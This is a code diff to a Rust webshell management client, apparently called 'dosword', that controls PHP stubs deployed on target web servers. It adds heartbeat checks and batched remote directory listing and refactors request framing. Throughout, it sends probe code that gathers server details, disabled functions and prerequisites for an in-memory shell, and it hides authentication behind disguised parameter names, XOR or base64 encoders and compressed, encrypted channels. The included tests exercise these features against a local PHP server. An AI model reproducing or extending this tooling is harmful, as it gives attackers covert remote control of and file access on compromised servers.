@@ -22,7 +22,7 @@ use dosword_sdk::domain::{
     ProbeResult, ShellProfile, TargetCapabilities,
 };
 
-use super::transport::{build_client, form_escape, json_str};
+use super::transport::{build_client, form_escape};
 use dosword_sdk::encoder::{EncoderRegistry, PayloadEncoder};
 use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
 use dosword_sdk::{Protocol, ProtocolError, SessionState};
@@ -475,19 +475,9 @@ impl PhpProtocol {
         // info 表：能力协商（ProtoVersion/Capabilities）与内存马前置判定
         // （PHP_SAPI / user_ini_filename / DOCUMENT_ROOT）都依赖它，
         // 旧实现只回 9 个扁平字段，导致 legacy 通道「看起来不支持任何能力」。
-        // 能力串去掉 gzip：legacy 通道的请求由**已部署的 stub** 解包，而旧 stub
-        // 不会 gunzip（stub 版本在客户端不可知）——客户端在这条通道上也确实不压缩。
-        // 分阶段载荷的 gzip 由每次注入的处理器解压，那条通道才报 gzip。
-        let info = dosword_sdk::php_impl::PHP_INFO_IMPL.replace(
-            "chunked,stream,db,plugin,exec,gzip_plain",
-            "chunked,stream,db,plugin,exec",
-        );
-        let code = format!(
-            "{}\n{}\n$__r=array('ok'=>true,'data'=>array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info));{}",
-            Self::build_prefix(encoder, &profile.password),
-            info,
-            TEMPLATE_FRAME
-        );
+        // 能力串去掉 batch / gzip_plain：
+        let effective = effective_password(&profile.protocol_params, &profile.password);
+        let code = Self::legacy_probe_code(encoder, &effective);
         let client = match reused_client {
             Some(client) => client.clone(),
             None => build_client(settings),
@@ -497,7 +487,7 @@ impl PhpProtocol {
             endpoint: profile.endpoint.clone(),
             // 加盐 stub 必须用派生后的有效密码（此前 legacy 探针漏了这一步，
             // 导致「加盐 + legacy 编码器」在探测阶段就鉴权失败）
-            password: effective_password(&profile.protocol_params, &profile.password),
+            password: effective,
             client,
             encoder,
             initialized: std::sync::Mutex::new(false),
@@ -659,43 +649,9 @@ impl PhpProtocol {
         settings: &AppSettings,
     ) -> Result<DirListing, ProtocolError> {
         let value = dispatch(php, "list", &[("p", path)], settings)?;
-        let entries = value
-            .pointer("/data/entries")
-            .and_then(|v| v.as_array())
-            .map(|array| {
-                array
-                    .iter()
-                    .map(|item| FileEntry {
-                        name: item
-                            .get("name")
-                            .and_then(|v| v.as_str())
-                            .unwrap_or("")
-                            .to_string(),
-                        path: item
-                            .get("path")
-                            .and_then(|v| v.as_str())
-                            .unwrap_or("")
-                            .to_string(),
-                        is_dir: item
-                            .get("is_dir")
-                            .and_then(|v| v.as_bool())
-                            .unwrap_or(false),
-                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
-                        modified: item
-                            .get("mtime")
-                            .and_then(|v| v.as_i64())
-                            .map(format_timestamp)
-                            .unwrap_or_default(),
-                        perms: item
-                            .get("perms")
-                            .and_then(|v| v.as_str())
-                            .unwrap_or("")
-                            .to_string(),
-                    })
-                    .collect()
-            })
-            .unwrap_or_default();
-        Ok(DirListing { entries })
+        Ok(DirListing {
+            entries: parse_entries(&value),
+        })
     }
 
     fn session_read_file(
@@ -870,6 +826,24 @@ impl PhpProtocol {
 
     /// 构建鉴权前缀（密码参数名随编码器业务伪装模板变化：token / k）。
     /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
+    /// legacy 通道的环境探测代码（连接探测与心跳共用）。
+    ///
+    /// 能力串去掉 batch / gzip_plain：
+    /// - legacy 的请求由**已部署的 stub** 解包，旧 stub 不会 gunzip；
+    ///   且逐请求代码没有统一分发器，无法一次往返跑多个操作。
+    fn legacy_probe_code(encoder: &dyn PayloadEncoder, password: &str) -> String {
+        let info = dosword_sdk::php_impl::PHP_INFO_IMPL.replace(
+            "chunked,stream,db,plugin,exec,batch,gzip_plain",
+            "chunked,stream,db,plugin,exec",
+        );
+        format!(
+            "{}\n{}\n$__r=array('ok'=>true,'data'=>array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info));{}",
+            Self::build_prefix(encoder, password),
+            info,
+            TEMPLATE_FRAME
+        )
+    }
+
     fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
         if encoder.body_mode() {
             // 请求体直传（php_stream）：代码作为完整 PHP 文件执行，同样自带符号表
@@ -1169,6 +1143,27 @@ impl Protocol for PhpProtocol {
         Ok(String::from_utf8_lossy(&bytes).into_owned())
     }
 
+    fn heartbeat(
+        &self,
+        session: &dyn SessionState,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        let php = session
+            .as_any()
+            .downcast_ref::<PhpSession>()
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        if is_session(php) {
+            // NATIVE / 分阶段：probe 在**所有版本**的 stub 上都存在，
+            // 不需要新的能力位（旧 stub 也能量到心跳）
+            dispatch(php, "probe", &[], settings).map(|_| ())
+        } else {
+            // legacy：逐请求探测模板（与连接探测同一份代码）
+            let code = Self::legacy_probe_code(php.encoder, &php.password);
+            self.send_frame(php, &code, settings, "heartbeat")
+                .map(|_| ())
+        }
+    }
+
     fn probe(
         &self,
         profile: &ShellProfile,
@@ -1323,6 +1318,43 @@ impl Protocol for PhpProtocol {
             .unwrap_or_default();
 
         Ok(DirListing { entries })
+    }
+
+    fn batch_list_dir(
+        &self,
+        session: &dyn SessionState,
+        paths: &[String],
+        settings: &AppSettings,
+    ) -> Result<dosword_sdk::protocol::BatchDirResult, ProtocolError> {
+        let php = session
+            .as_any()
+            .downcast_ref::<PhpSession>()
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        require_capability(php, "batch")?;
+        if paths.is_empty() {
+            return Ok(Vec::new());
+        }
+        let ops: Vec<Value> = paths
+            .iter()
+            .map(|path| serde_json::json!({ "a": "list", "p": path }))
+            .collect();
+        let results = dispatch_batch(php, &ops, settings)?;
+        if results.len() != paths.len() {
+            return Err(ProtocolError::ParseError(format!(
+                "批量响应条数不符（{} 项请求 / {} 项返回）",
+                paths.len(),
+                results.len()
+            )));
+        }
+        Ok(paths
+            .iter()
+            .cloned()
+            .zip(
+                results
+                    .iter()
+                    .map(|result| parse_dir_listing(result).map_err(|error| error.to_string())),
+            )
+            .collect())
     }
 
     fn read_file(
@@ -1824,13 +1856,32 @@ fn session_call(
     params: &[(&str, &str)],
     settings: &AppSettings,
 ) -> Result<Value, ProtocolError> {
+    let mut request = serde_json::Map::new();
+    request.insert("a".to_string(), Value::String(action.to_string()));
+    for (key, value) in params {
+        request.insert((*key).to_string(), Value::String((*value).to_string()));
+    }
+    session_call_json(php, action, &Value::Object(request), settings)
+}
+
+/// 分阶段通道的原始 JSON 调用（支持嵌套结构，如批量的 `ops` 数组）。
+fn session_call_json(
+    php: &PhpSession,
+    action: &str,
+    request: &Value,
+    settings: &AppSettings,
+) -> Result<Value, ProtocolError> {
     ensure_session_init(php, settings)?;
     let nonce = random_nonce();
-    let mut request = format!("{{\"a\":\"{action}\",\"n\":\"{nonce}\"");
-    for (key, value) in params {
-        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
-    }
-    request.push('}');
+    // 帧定位用的 nonce 由客户端注入到请求对象里（处理器原样回显）
+    let mut request = request.clone();
+    let Some(object) = request.as_object_mut() else {
+        return Err(ProtocolError::ParseError(
+            "请求必须是 JSON 对象".to_string(),
+        ));
+    };
+    object.insert("n".to_string(), Value::String(nonce.clone()));
+    let request_text = request.to_string();
 
     // gzip：分阶段载荷在**明文层**压缩，包成 {"n":..,"z":1,"d":base64(gzip(原请求))}。
     // 处理器是客户端每次连接注入的，所以这条路径不受目标上已部署 stub 版本影响；
@@ -1841,9 +1892,9 @@ fn session_call(
         .as_ref()
         .map(|caps| caps.supports("gzip_plain"))
         .unwrap_or(true);
-    let mut sent = request.clone();
-    if settings.gzip_enabled && gzip_ok && request.len() >= 1024 {
-        let encoded = B64.encode(request.as_bytes());
+    let mut sent = request_text.clone();
+    if settings.gzip_enabled && gzip_ok && request_text.len() >= 1024 {
+        let encoded = B64.encode(request_text.as_bytes());
         let packed = crate::protocol::transport::gzip_payload(&encoded, true);
         // 压缩无收益（高熵内容）时按原样发送，避免"压缩后更大"
         if packed != encoded {
@@ -1851,7 +1902,7 @@ fn session_call(
         }
     }
     let payload = encode_payload(php, &sent)?;
-    let plain = session_post(php, action, &request, payload, settings)?;
+    let plain = session_post(php, action, &request_text, payload, settings)?;
     // 响应：处理器可能把帧内容先 gzip 再 base64（按魔数识别，无需版本协商）
     let plain = crate::protocol::transport::gunzip_bytes_if_needed(plain);
     let text = String::from_utf8_lossy(&plain);
@@ -1863,7 +1914,7 @@ fn session_call(
     let tail = &text[start + nonce.len()..];
     let end = tail
         .find(&nonce)
-        .ok_or(ProtocolError::ParseError("协议帧不完整".to_string()))?;
+        .ok_or_else(|| ProtocolError::ParseError("协议帧不完整".to_string()))?;
     let payload_b64 = &tail[..end];
     let decoded = B64
         .decode(payload_b64)
@@ -1901,12 +1952,21 @@ fn native_call(
     params: &[(&str, &str)],
     settings: &AppSettings,
 ) -> Result<Value, ProtocolError> {
-    let mut request = format!("{{\"a\":\"{action}\"");
+    let mut request = serde_json::Map::new();
+    request.insert("a".to_string(), Value::String(action.to_string()));
     for (key, value) in params {
-        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
+        request.insert((*key).to_string(), Value::String((*value).to_string()));
     }
-    request.push('}');
+    native_call_json(php, action, &Value::Object(request).to_string(), settings)
+}
 
+/// NATIVE 通道的原始 JSON 调用（支持嵌套结构，如批量的 `ops` 数组）。
+fn native_call_json(
+    php: &PhpSession,
+    action: &str,
+    request: &str,
+    settings: &AppSettings,
+) -> Result<Value, ProtocolError> {
     // 传输压缩（gzip）：新 stub 走**明文层**信封 —— 压缩发生在加密之前，
     // 才能真正收回 base64 的 33% 膨胀；密文是高频熵数据，密文层压缩收益接近零。
     // 旧 stub（未上报 gzip_plain）保持既有行为：密文层压缩（v0.1.0 起的 stub 都会解压）。
@@ -1915,10 +1975,10 @@ fn native_call(
         .as_ref()
         .map(|caps| caps.supports("gzip_plain"))
         .unwrap_or(false);
-    let mut sent = request.clone();
+    let mut sent = request.to_string();
     if settings.gzip_enabled
         && gzip_plain
-        && let Some(envelope) = gzip_plain_envelope(&request)
+        && let Some(envelope) = gzip_plain_envelope(request)
     {
         sent = envelope;
     }
@@ -1952,13 +2012,13 @@ fn native_call(
     let response = match builder.body(body).send() {
         Ok(response) => response,
         Err(error) => {
-            log_request(php, action, 0, started, &request, "");
+            log_request(php, action, 0, started, request, "");
             return Err(ProtocolError::Network(error.to_string()));
         }
     };
     let status = response.status();
     if !status.is_success() {
-        log_request(php, action, status.as_u16(), started, &request, "");
+        log_request(php, action, status.as_u16(), started, request, "");
         return Err(ProtocolError::HttpStatus(
             status.as_u16(),
             status.canonical_reason().unwrap_or("").to_string(),
@@ -1974,7 +2034,7 @@ fn native_call(
         )));
     }
     let text = String::from_utf8_lossy(&bytes);
-    log_request(php, action, status.as_u16(), started, &request, &text);
+    log_request(php, action, status.as_u16(), started, request, &text);
     let outer: Value = serde_json::from_str(&text)
         .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
     let data = outer
@@ -2015,6 +2075,82 @@ fn dispatch(
     } else {
         session_call(php, action, params, settings)
     }
+}
+
+/// 多路复用：一次往返执行多个逻辑调用，返回逐项结果。
+///
+/// 仅 NATIVE / 分阶段通道支持（stub 与处理器都有统一分发器）；
+/// legacy 逐请求通道没有服务端分发器，调用方应先检查 `batch` 能力。
+fn dispatch_batch(
+    php: &PhpSession,
+    ops: &[Value],
+    settings: &AppSettings,
+) -> Result<Vec<Value>, ProtocolError> {
+    let request = serde_json::json!({ "a": "batch", "ops": ops });
+    let value = if is_native(php) {
+        native_call_json(php, "batch", &request.to_string(), settings)?
+    } else {
+        session_call_json(php, "batch", &request, settings)?
+    };
+    value
+        .pointer("/data/results")
+        .and_then(|item| item.as_array())
+        .cloned()
+        .ok_or_else(|| ProtocolError::ParseError("批量响应缺少 results".to_string()))
+}
+
+/// 把 `{ok, data:{entries}}` 形态的响应解析为目录列表（单次与批量共用）。
+fn parse_dir_listing(value: &Value) -> Result<DirListing, ProtocolError> {
+    if value.get("ok").and_then(|item| item.as_bool()) != Some(true) {
+        let message = value
+            .get("error")
+            .and_then(|item| item.as_str())
+            .unwrap_or("目录列举失败");
+        return Err(ProtocolError::ServerError(message.to_string()));
+    }
+    Ok(DirListing {
+        entries: parse_entries(value),
+    })
+}
+
+/// 从 `/data/entries` 解析文件项（单次与批量共用）。
+fn parse_entries(value: &Value) -> Vec<FileEntry> {
+    value
+        .pointer("/data/entries")
+        .and_then(|item| item.as_array())
+        .map(|array| {
+            array
+                .iter()
+                .map(|item| FileEntry {
+                    name: item
+                        .get("name")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("")
+                        .to_string(),
+                    path: item
+                        .get("path")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("")
+                        .to_string(),
+                    is_dir: item
+                        .get("is_dir")
+                        .and_then(|v| v.as_bool())
+                        .unwrap_or(false),
+                    size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
+                    modified: item
+                        .get("mtime")
+                        .and_then(|v| v.as_i64())
+                        .map(format_timestamp)
+                        .unwrap_or_default(),
+                    perms: item
+                        .get("perms")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("")
+                        .to_string(),
+                })
+                .collect()
+        })
+        .unwrap_or_default()
 }
 
 fn conn_json(connection: &DbConnection) -> String {
@@ -2553,6 +2689,104 @@ for($i=0;$i<strlen($raw);$i++){$code.=$raw[$i]^$key[$i%strlen($key)];}
                 );
             }
         }
+    }
+
+    /// W4 心跳：三条通道都能轻量探活；目标下线后必须报错（stale 的依据）。
+    #[test]
+    fn real_php_heartbeat_round_trip() {
+        let settings = settings();
+        for encoder_id in ["native", "xor_session", "base64"] {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
+            else {
+                eprintln!("跳过：未检测到 php 可执行文件");
+                return;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            let (session, _) = PhpProtocol
+                .connect(&profile, &settings)
+                .unwrap_or_else(|error| panic!("{encoder_id} 连接失败：{error}"));
+            // 在线：心跳成功
+            PhpProtocol
+                .heartbeat(session.as_ref(), &settings)
+                .unwrap_or_else(|error| panic!("{encoder_id} 心跳失败：{error}"));
+            // 目标下线：心跳必须失败（会话层据此标记 stale）
+            let _ = child.kill();
+            let _ = child.wait();
+            let error = PhpProtocol
+                .heartbeat(session.as_ref(), &settings)
+                .expect_err("目标下线后心跳必须失败");
+            assert!(!error.to_string().is_empty());
+            let _ = std::fs::remove_dir_all(&dir);
+        }
+    }
+
+    /// W4 多路复用：一次往返列举多个目录（NATIVE / 分阶段通道）。
+    ///
+    /// 逐目录容错：不存在的目录只让该项失败，其余照常返回。
+    /// legacy 逐请求通道没有服务端分发器 → 必须明确 `NotSupported`（命令层据此回退）。
+    #[test]
+    fn real_php_batch_list_dir_round_trip() {
+        let settings = settings();
+        for encoder_id in ["native", "xor_session"] {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
+            else {
+                eprintln!("跳过：未检测到 php 可执行文件");
+                return;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            let result = (|| -> Result<(), ProtocolError> {
+                let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
+                assert!(
+                    probe
+                        .capabilities
+                        .as_ref()
+                        .is_some_and(|caps| caps.supports("batch")),
+                    "{encoder_id} 应上报 batch 能力：{:?}",
+                    probe.capabilities
+                );
+                let paths = vec![
+                    dir.display().to_string(),
+                    dir.join("www").display().to_string(),
+                    format!("{}/missing", dir.display()),
+                ];
+                let results = PhpProtocol.batch_list_dir(session.as_ref(), &paths, &settings)?;
+                assert_eq!(results.len(), 3, "{encoder_id} 批量结果条数不符");
+                assert!(results[0].1.is_ok(), "{encoder_id} 根目录应成功");
+                let www = results[1]
+                    .1
+                    .as_ref()
+                    .map_err(|error| ProtocolError::ParseError(error.clone()))?;
+                assert!(
+                    www.entries.iter().any(|entry| entry.name == "hello.txt"),
+                    "{encoder_id} 批量结果缺少 hello.txt"
+                );
+                assert!(results[2].1.is_err(), "{encoder_id} 不存在的目录应单项失败");
+                Ok(())
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            result.unwrap_or_else(|error| panic!("{encoder_id} 批量列举失败：{error}"));
+        }
+
+        // legacy 通道：明确不支持（无服务端分发器）
+        let Some((url, dir, mut child)) = spawn_php_server_with("base64", "secret", false) else {
+            return;
+        };
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"base64"}"#.to_string();
+        let (session, _) = PhpProtocol
+            .connect(&profile, &settings)
+            .expect("legacy 连接");
+        let error = PhpProtocol
+            .batch_list_dir(session.as_ref(), &[dir.display().to_string()], &settings)
+            .expect_err("legacy 通道不应支持批量");
+        assert!(matches!(error, ProtocolError::NotSupported(_)), "{error}");
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     /// W2：传输形态配置的校验（非法值必须拒绝，尤其是请求头注入）。
